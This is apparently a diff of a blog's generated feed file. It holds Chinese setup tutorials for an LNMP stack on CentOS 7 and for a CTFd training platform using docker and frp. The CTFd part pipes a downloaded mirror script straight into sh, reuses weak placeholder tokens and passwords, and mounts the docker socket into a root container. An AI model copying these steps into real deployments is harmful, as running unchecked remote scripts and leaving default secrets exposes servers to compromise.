-<h3 id="1-2安装Nginx"><a href="#1-2安装Nginx" class="headerlink" title="1.2安装Nginx"></a>1.2安装Nginx</h3><p>让我们回到正题：安装Nginx</p>
-<pre><code>yum install -y nginx</code></pre><h3 id="1-3常用配置"><a href="#1-3常用配置" class="headerlink" title="1.3常用配置"></a>1.3常用配置</h3><p>设置开机启动</p>
-<pre><code>systemctl enable nginx</code></pre><p>启动服务</p>
-<pre><code>systemctl start nginx.service</code></pre><p>停止服务</p>
-<pre><code>systemctl restart nginx</code></pre><p>重新加载</p>
-<pre><code>systemctl reload nginx</code></pre><h3 id="1-4打开防火墙端口"><a href="#1-4打开防火墙端口" class="headerlink" title="1.4打开防火墙端口"></a>1.4打开防火墙端口</h3><p>默认 CentOS7 使用的防火墙 firewalld 是关闭 http 服务的（打开 80 端口）。</p>
-<pre><code>firewall-cmd --zone=public --permanent --add-service=http
-firewall-cmd --reload</code></pre><p>这个时候就可以查看一下防火墙打开的所有的服务。</p>
-<pre><code>firewall-cmd --list-service</code></pre><p>这时候用浏览器访问目标服务器的IP就可以看到Nginx的默认界面了。</p>
-<h2 id="二-安装mysql"><a href="#二-安装mysql" class="headerlink" title="二 安装mysql"></a>二 安装mysql</h2><p>下载mysql的repo源</p>
-<pre><code>wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP1.png" alt=""></p>
-<p>安装mysql-community-release-el7-5.noarch.rpm包</p>
-<pre><code>rpm -ivh mysql-community-release-el7-5.noarch.rpm</code></pre><p>安装MYSQL:</p>
-<pre><code>yum install -y mysql-server</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP2.png" alt=""></p>
-<p>更改MYSQL用户权限：</p>
-<pre><code>chown -R root:root /var/lib/mysql</code></pre><p>重启服务：</p>
-<pre><code>systemctl restart mysql.service</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP3.png" alt=""></p>
-<h2 id="三-安装php"><a href="#三-安装php" class="headerlink" title="三 安装php"></a>三 安装php</h2><h3 id="3-1安装php"><a href="#3-1安装php" class="headerlink" title="3.1安装php"></a>3.1安装php</h3><p>rpm 安装 Php7 相应的 yum源</p>
-<pre><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
-rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><p>安装php7.0</p>
-<pre><code>yum install -y php70w</code></pre><p>安装php扩展</p>
-<pre><code>yum install -y  php70w-mysql.x86_64   php70w-gd.x86_64   php70w-ldap.x86_64   php70w-mbstring.x86_64  php70w-mcrypt.x86_64</code></pre><p>安装PHP FPM：</p>
-<pre><code>yum install -y php70w-fpm</code></pre><h3 id="3-2配置"><a href="#3-2配置" class="headerlink" title="3.2配置"></a>3.2配置</h3><p> 修改Nginx配置文件：</p>
-<pre><code>vim /etc/nginx/conf.d/default.conf</code></pre><p>修改 root目录,可自定义：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p> 修改配置php解析：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">        root           html;</span><br><span class="line">        fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;</span><br><span class="line">        <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>修改php-fpm配置文件<br>php-fpm配置文件位置：（/etc/php-fpm.d/<a href="http://www.conf）" target="_blank" rel="noopener">www.conf）</a></p>
-<p>修改</p>
-<pre><code>user =nginx
-group=nginx</code></pre><p>放入测试文件</p>
-<pre><code>cd /usr/share/nginx/html
-vi index.php</code></pre><p>在其中写入：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3启动"><a href="#3-3启动" class="headerlink" title="3.3启动"></a>3.3启动</h3><p>启动nginx服务：</p>
-<pre><code>systemctl start nginx.service</code></pre><p>查看启动状态：</p>
-<pre><code>systemctl status nginx</code></pre><p> 启动PHP-FPM：</p>
-<pre><code>systemctl start php-fpm.service</code></pre><p>查看启动状态：</p>
-<pre><code>systemctl status php-fpm.service</code></pre><h3 id="3-4测试"><a href="#3-4测试" class="headerlink" title="3.4测试"></a>3.4测试</h3><p>在浏览器打开localhost/index.php<br>看到 phpinfo 的信息就大功告成！！</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 计算机网络 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>环境搭建</title>
+      <link href="/2020/02/11/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
+      <url>/2020/02/11/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> CentOs 7 搭建Nginx+php-fpm+MySQL记录</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/1.jpg" alt=""></p><a id="more"></a><h1 id="CentOs-7-搭建Nginx-php-fpm-MySQL记录"><a href="#CentOs-7-搭建Nginx-php-fpm-MySQL记录" class="headerlink" title="CentOs 7 搭建Nginx+php-fpm+MySQL记录"></a>CentOs 7 搭建Nginx+php-fpm+MySQL记录</h1><p>操作系统：CentOs 7</p><h2 id="一-安装Nginx"><a href="#一-安装Nginx" class="headerlink" title="一 安装Nginx"></a>一 安装Nginx</h2><h3 id="1-1添加yum源"><a href="#1-1添加yum源" class="headerlink" title="1.1添加yum源"></a>1.1添加yum源</h3><p>安装wget：</p><pre><code>yum install wget -y</code></pre><p>下载对应当前系统版本的nginx包</p><pre><code>wget http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>由于Nginx不在默认的yum源中，所以需要建立nginx的yum仓库。</p><pre><code>rpm -ivh nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>安装好yum源后，可以查看一下。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>root ~]# yum repolist</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">repo id                                repo name                                                            status</span><br><span class="line">base/<span class="number">7</span>/x86_64                          CentOS<span class="number">-7</span> - Base - mirrors.aliyun.com                                 <span class="number">10</span>,<span class="number">097</span></span><br><span class="line">epel/x86_64                            Extra Packages <span class="keyword">for</span> Enterprise Linux <span class="number">7</span> - x86_64                       <span class="number">13</span>,<span class="number">524</span></span><br><span class="line">extras/<span class="number">7</span>/x86_64                        CentOS<span class="number">-7</span> - Extras - mirrors.aliyun.com                                  <span class="number">323</span></span><br><span class="line">nginx/x86_64                           nginx repo                                                              <span class="number">172</span></span><br><span class="line">updates/<span class="number">7</span>/x86_64                       CentOS<span class="number">-7</span> - Updates - mirrors.aliyun.com                               <span class="number">1</span>,<span class="number">446</span></span><br><span class="line">repolist: <span class="number">25</span>,<span class="number">562</span></span><br></pre></td></tr></table></figure><p>可以发现Nginx repo 已经安装到本机了。</p><p>由于下载过程中yum的官方源太慢了，这里把yum源换成了阿里云的。</p><p>第一步：进入yum源配置文件所在文件夹</p><pre><code>cd /etc/yum.repos.d/</code></pre><p>第二步：备份/etc/yum.repos.d/CentOS-Base.repo；</p><pre><code>mv ./CentOS-Base.repo ./CentOS-Base.repo.bak</code></pre><p>第三步：下载aliyun的yum源配置文件，放入/etc/yum.repos.d/下，并更改名称为CentOS-Base.repo；</p><pre><code>wget http://mirrors.aliyun.com/repo/Centos-7.repomv Centos-7.repo CentOS-Base.repo</code></pre><p>第四步：运行yum makecache生成缓存:</p><pre><code>yum makecache</code></pre><p>第四步：更新yum:</p><pre><code>yum -y update</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP4.png" alt=""></p><h3 id="1-2安装Nginx"><a href="#1-2安装Nginx" class="headerlink" title="1.2安装Nginx"></a>1.2安装Nginx</h3><p>让我们回到正题：安装Nginx</p><pre><code>yum install -y nginx</code></pre><h3 id="1-3常用配置"><a href="#1-3常用配置" class="headerlink" title="1.3常用配置"></a>1.3常用配置</h3><p>设置开机启动</p><pre><code>systemctl enable nginx</code></pre><p>启动服务</p><pre><code>systemctl start nginx.service</code></pre><p>停止服务</p><pre><code>systemctl restart nginx</code></pre><p>重新加载</p><pre><code>systemctl reload nginx</code></pre><h3 id="1-4打开防火墙端口"><a href="#1-4打开防火墙端口" class="headerlink" title="1.4打开防火墙端口"></a>1.4打开防火墙端口</h3><p>默认 CentOS7 使用的防火墙 firewalld 是关闭 http 服务的（打开 80 端口）。</p><pre><code>firewall-cmd --zone=public --permanent --add-service=httpfirewall-cmd --reload</code></pre><p>这个时候就可以查看一下防火墙打开的所有的服务。</p><pre><code>firewall-cmd --list-service</code></pre><p>这时候用浏览器访问目标服务器的IP就可以看到Nginx的默认界面了。</p><h2 id="二-安装mysql"><a href="#二-安装mysql" class="headerlink" title="二 安装mysql"></a>二 安装mysql</h2><p>下载mysql的repo源</p><pre><code>wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP1.png" alt=""></p><p>安装mysql-community-release-el7-5.noarch.rpm包</p><pre><code>rpm -ivh mysql-community-release-el7-5.noarch.rpm</code></pre><p>安装MYSQL:</p><pre><code>yum install -y mysql-server</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP2.png" alt=""></p><p>更改MYSQL用户权限：</p><pre><code>chown -R root:root /var/lib/mysql</code></pre><p>重启服务：</p><pre><code>systemctl restart mysql.service</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP3.png" alt=""></p><h2 id="三-安装php"><a href="#三-安装php" class="headerlink" title="三 安装php"></a>三 安装php</h2><h3 id="3-1安装php"><a href="#3-1安装php" class="headerlink" title="3.1安装php"></a>3.1安装php</h3><p>rpm 安装 Php7 相应的 yum源</p><pre><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><p>安装php7.0</p><pre><code>yum install -y php70w</code></pre><p>安装php扩展</p><pre><code>yum install -y  php70w-mysql.x86_64   php70w-gd.x86_64   php70w-ldap.x86_64   php70w-mbstring.x86_64  php70w-mcrypt.x86_64</code></pre><p>安装PHP FPM：</p><pre><code>yum install -y php70w-fpm</code></pre><h3 id="3-2配置"><a href="#3-2配置" class="headerlink" title="3.2配置"></a>3.2配置</h3><p> 修改Nginx配置文件：</p><pre><code>vim /etc/nginx/conf.d/default.conf</code></pre><p>修改 root目录,可自定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> 修改配置php解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">        root           html;</span><br><span class="line">        fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;</span><br><span class="line">        <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>修改php-fpm配置文件<br>php-fpm配置文件位置：（/etc/php-fpm.d/<a href="http://www.conf）" target="_blank" rel="noopener">www.conf）</a></p><p>修改</p><pre><code>user =nginxgroup=nginx</code></pre><p>放入测试文件</p><pre><code>cd /usr/share/nginx/htmlvi index.php</code></pre><p>在其中写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-3启动"><a href="#3-3启动" class="headerlink" title="3.3启动"></a>3.3启动</h3><p>启动nginx服务：</p><pre><code>systemctl start nginx.service</code></pre><p>查看启动状态：</p><pre><code>systemctl status nginx</code></pre><p> 启动PHP-FPM：</p><pre><code>systemctl start php-fpm.service</code></pre><p>查看启动状态：</p><pre><code>systemctl status php-fpm.service</code></pre><h3 id="3-4测试"><a href="#3-4测试" class="headerlink" title="3.4测试"></a>3.4测试</h3><p>在浏览器打开localhost/index.php<br>看到 phpinfo 的信息就大功告成！！</p>]]></content>
+      
+      
       <categories>
-        <category>LNMP</category>
+          
+          <category> LNMP </category>
+          
       </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>环境</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建CTF平台</title>
-    <url>/2020/01/28/%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>想搭一个CTF平台给大家刷题，顺便记录一下搭建过程</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/imgSWFC_EN-AU8629361490_1920x1080.jpg" alt=""></p>
-<p>过年有活动就在阿里云上租了一个服务器练手：</p>
-<p>服务器：Centos 7.4 64位</p>
-<p>开源平台：CTFd</p>
-<a id="more"></a>
-
-<h1 id="一-安装docker"><a href="#一-安装docker" class="headerlink" title="一 安装docker"></a>一 安装docker</h1><h2 id="安装yum"><a href="#安装yum" class="headerlink" title="安装yum"></a>安装yum</h2><p>1.更新yum包</p>
-<pre><code>yum update</code></pre><p>2.安装必要的系统工具</p>
-<pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre><p>3.设置yum源</p>
-<pre><code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>4.查看并选择合适的docker版本</p>
-<pre><code>yum list docker-ce --showduplicates | sort -r</code></pre><p>5.安装docker</p>
-<pre><code>yum install docker-ce-17.12.1.ce</code></pre><p>6.启动</p>
-<pre><code>systemctl start docker.service</code></pre><p>7.设置为开机自启动</p>
-<pre><code>systemctl enable docker.service</code></pre><p>8.DaoCloud配置docker镜像源加速</p>
-<pre><code>curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</code></pre><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>1.选择最新的docker-compose版本并下载，官方源安装</p>
-<pre><code>sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</code></pre><p>由于过于缓慢换源</p>
-<pre><code>curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</code></pre><p>2.设置docker-compose执行权限</p>
-<pre><code>sudo chmod +x /usr/local/bin/docker-compose
-
-docker-compose --version</code></pre><h1 id="二-安装frp"><a href="#二-安装frp" class="headerlink" title="二 安装frp"></a>二 安装frp</h1><p> 安装启动frps</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">wget</span> <span class="string">https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="attr">tar</span> <span class="string">-zxvf frp_0.29.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">frp_0.29.0_linux_amd64</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp systemd/* /etc/systemd/system/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">mkdir /etc/frp</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp frpc.ini  frps.ini /etc/frp/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp frpc  frps /usr/bin/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">chmod a+x /usr/bin/frpc /usr/bin/frps</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl enable frps</span></span><br></pre></td></tr></table></figure>
-
-<p>编辑frps.ini</p>
-<pre><code>sudo vim /etc/frp/frps.ini</code></pre><p>frps.ini</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7897</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">token</span> =thisistoken</span><br></pre></td></tr></table></figure>
-
-<p>至于frpc.ini，先不急着配置，后面会配置<br>启动frps系统服务</p>
-<pre><code>sudo systemctl start frps</code></pre><p>创建网络并启动frpc容器并配置frpc.ini</p>
-<p>启动frpc容器</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo docker<span class="built_in"> network </span>create ctfd_frp-containers</span><br><span class="line">sudo docker <span class="builtin-name">run</span>  -d -v ~/frp_0.29.0_linux_amd64/frpc.ini:/etc/frp/frpc.ini <span class="attribute">--network</span>=<span class="string">"ctfd_frp-containers"</span> <span class="attribute">--restart</span>=always <span class="string">"glzjin/frp"</span></span><br></pre></td></tr></table></figure>
-
-<p>创建网络frpcadmin用于ctfd容器和frpc容器通信</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo docker<span class="built_in"> network </span>create frpcadmin</span><br></pre></td></tr></table></figure>
-
-<p>连接frpc,如果不知道可以frpc容器名，可以用</p>
-<pre><code>docker ps</code></pre><p>查看frpc的容器名或2ID</p>
-<pre><code>sudo docker network connect frpcadmin &lt;frpc容器名或者ID&gt; </code></pre><p>将frpc和ctfd容器单独连接到网络frpcadmin,注意要等容器创建好之后再连接，因此ctfd将在稍后连接</p>
-<p>查看frpcadmin网络的连接情况并记录frpc容器的网络IP</p>
-<pre><code>docker network inspect frpcadmin </code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/2.png" alt=""></p>
-<p>编辑frpc.ini</p>
-<pre><code>vim ~/frp_0.29.0_linux_amd64/frpc.ini</code></pre><p>frpc.ini</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.17</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7897</span></span><br><span class="line"><span class="attr">token</span>=thisistoken</span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">172.19</span>.<span class="number">0.2</span> <span class="comment">#这里填写frpc容器在frpcadmin网络里的ip</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br><span class="line"><span class="attr">log_file</span> = ./frps.log</span><br></pre></td></tr></table></figure>
-
-<h1 id="三-安装CTFd"><a href="#三-安装CTFd" class="headerlink" title="三 安装CTFd"></a>三 安装CTFd</h1><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><pre><code>sudo yum install -y git</code></pre><h2 id="从Github上下载CTFd与插件"><a href="#从Github上下载CTFd与插件" class="headerlink" title="从Github上下载CTFd与插件"></a>从Github上下载CTFd与插件</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/CTFd/CTFd.git</span></span><br><span class="line"><span class="keyword">cd</span> CTFd/</span><br><span class="line"><span class="keyword">cd</span> CTFd/plugins <span class="comment">#打开ctfd插件目录</span></span><br><span class="line">git clone https:<span class="string">//github.com/glzjin/CTFd-Whale.git</span> ctfd-whale <span class="comment">#确保插件文件夹小写</span></span><br><span class="line"><span class="keyword">cd</span> ctfd-whale</span><br><span class="line"><span class="keyword">cd</span> <span class="string">../../../</span> <span class="comment">#返回ctfd主目录</span></span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>
-
-<p>配置docker-compose.yml</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">version</span>: <span class="string">'2'</span></span><br><span class="line">service<span class="variable">s:</span></span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    port<span class="variable">s:</span></span><br><span class="line">      - <span class="string">"8000:8000"</span> #你自己的</span><br><span class="line">    environmen<span class="variable">t:</span></span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysq<span class="variable">l:</span>//roo<span class="variable">t:ctfd</span>@db/ctfd</span><br><span class="line">      - REDIS_URL=<span class="keyword">redi</span><span class="variable">s:</span>//cache:<span class="number">6379</span></span><br><span class="line">      - WORKERS=<span class="number">1</span></span><br><span class="line">      - LOG_FOLDER=/var/<span class="built_in">log</span>/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">      - .data/CTFd/<span class="built_in">log</span><span class="variable">s:</span>/var/<span class="built_in">log</span>/CTFd</span><br><span class="line">      - .data/CTFd/upload<span class="variable">s:</span>/var/uploads</span><br><span class="line">      - .:/<span class="keyword">opt</span>/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock #添加这句即可，别的基本按照官方的不用动</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        defaul<span class="variable">t:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">  d<span class="variable">b:</span></span><br><span class="line">    image: mariad<span class="variable">b:10</span>.<span class="number">4</span></span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    environmen<span class="variable">t:</span></span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">      - .data/mysq<span class="variable">l:</span>/var/lib/mysql</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">    # This <span class="keyword">command</span> <span class="keyword">is</span> required <span class="keyword">to</span> <span class="keyword">set</span> important mariadb defaults</span><br><span class="line">    <span class="keyword">command</span>: [mysqld, --character-<span class="keyword">set</span>-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=<span class="number">28800</span>, --<span class="built_in">log</span>-warnings=<span class="number">0</span>]</span><br><span class="line">  cache:</span><br><span class="line">    image: <span class="keyword">redi</span><span class="variable">s:4</span></span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">    - .data/<span class="keyword">redi</span><span class="variable">s:</span>/data</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">network<span class="variable">s:</span></span><br><span class="line">    defaul<span class="variable">t:</span></span><br><span class="line">    interna<span class="variable">l:</span></span><br><span class="line">        interna<span class="variable">l:</span> true</span><br></pre></td></tr></table></figure>
-
-<p>重新build后启动ctfd 使用 docker-compose 启动项目</p>
-<pre><code>docker-compose build
-ddocker-compose up -d</code></pre><p>将ctfd连接frpcadmin网络</p>
-<pre><code>docker network connect frpcadmin &lt;ctfd容器名或者ID&gt;</code></pre><p>静静等待安装完成，成功会弹出<a href="http://0.0.0.0:8000,此时，你的ctfd就安装完成了" target="_blank" rel="noopener">http://0.0.0.0:8000,此时，你的ctfd就安装完成了</a>,<br>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。</p>
-<p>启动ctfd后进入注册管理员，然后进入管理页面选择插件</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B03.png" alt=""></p>
-<p>其余照着填就好了，Frp的API地址根据自己的填。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B04.png" alt=""></p>
-<p>Frp config template一栏，token写自己的，admin_addr根据自己的实际情况写，Docker Auto Connect Network照着写。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B05.png" alt=""></p>
-<h1 id="四-部署题目"><a href="#四-部署题目" class="headerlink" title="四 部署题目"></a>四 部署题目</h1><p>部署前先里了解一下Dockers的一些基本用法</p>
-<p>doker部署的东西分为镜像和容器两种，有什么区别呢？</p>
-<p>镜像：</p>
-<p>多个只读层叠加在一起，层与层之间通过指针关联，这些层能够在运行Docker的宿主机的文件系统上访问到</p>
-<p>容器：</p>
-<p>容器和容器镜像一样，也是若干层的叠加，唯一区别是所有只读层的最上面一层，是一层可读可写层，初学者可以记住这个简单的公式：容器 = 容器镜像 + 可读可写层</p>
-<h2 id="docker镜像常见命令"><a href="#docker镜像常见命令" class="headerlink" title="docker镜像常见命令"></a>docker镜像常见命令</h2><p>查看所有下载的镜像：</p>
-<pre><code>sudo docker images</code></pre><p>搜索镜像：</p>
-<pre><code>sudo docker search 镜像名称</code></pre><p>获取镜像：</p>
-<pre><code>sudo docker pull 镜像名称</code></pre><p>运行镜像：</p>
-<pre><code>sudo docker run -d --name 容器名称 -p 80:80 镜像名称</code></pre><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-d：后台运行</span></span><br><span class="line"><span class="deletion">-name：容器名称(自己命名)</span></span><br><span class="line"><span class="deletion">-p：指定docker运行此镜像所使用的端口，第一个是外网端口，第二个是内网端口</span></span><br><span class="line">–privileged：使用该参数，container内的root拥有真正的root权限</span><br><span class="line"><span class="deletion">-i：以交互模式运行容器</span></span><br><span class="line"><span class="deletion">-t：为容器重新分配一个伪输入终端</span></span><br><span class="line">–link 其他容器：将该容器与其他容器进行连接</span><br></pre></td></tr></table></figure>
-<p>删除镜像：</p>
-<pre><code>sudo docker rmi -f IMAGE-ID/name</code></pre><p>其中，IMAGE-ID可在镜像列表中查看；只需使用IMAGE ID前四位即可；也可以使用镜像的名字</p>
-<h2 id="docker容器常见命令"><a href="#docker容器常见命令" class="headerlink" title="docker容器常见命令"></a>docker容器常见命令</h2><p>查看容器列表：</p>
-<pre><code>sudo docker ps -a</code></pre><p>停止容器：</p>
-<pre><code>sudo docker stop CONTAINER-ID/name</code></pre><p>其中，CONTAINER ID可在容器列表中查看；只需使用CONTAINER ID前四位即可；也可以使用运行镜像时所命名的容器名字</p>
-<p>运行容器：</p>
-<pre><code>sudo docker start CONTAINER-ID/name</code></pre><p>删除容器(容器需已停止运行)：</p>
-<pre><code>sudo docker rm CONTAINER-ID/name</code></pre><p>进入容器(不知道什么原因，使用docker attach命令无法进入到容器中～)</p>
-<pre><code>sudo docker exec -it CONTAINER-ID/name /bin/bash</code></pre><p>不能用的话可以试试</p>
-<pre><code>sudo docker exec -it  CONTAINER-ID/name /bin/sh 
-
-sudo docker exec -it  CONTAINER-ID/name bash</code></pre><p>拷贝文件</p>
-<pre><code>docker cp ~/index.php 容器id:/var/www/html</code></pre><h2 id="开始部署题目"><a href="#开始部署题目" class="headerlink" title="开始部署题目"></a>开始部署题目</h2><p>1.本地部署镜像</p>
-<pre><code>docker pull ctftraining/qwb_2019_supersqli </code></pre><p>由于docker pull 官方源速度慢问题</p>
-<p>将docker镜像源修改为国内的：<br>在 /etc/docker/daemon.json 文件中添加以下参数（没有该文件则新建）：</p>
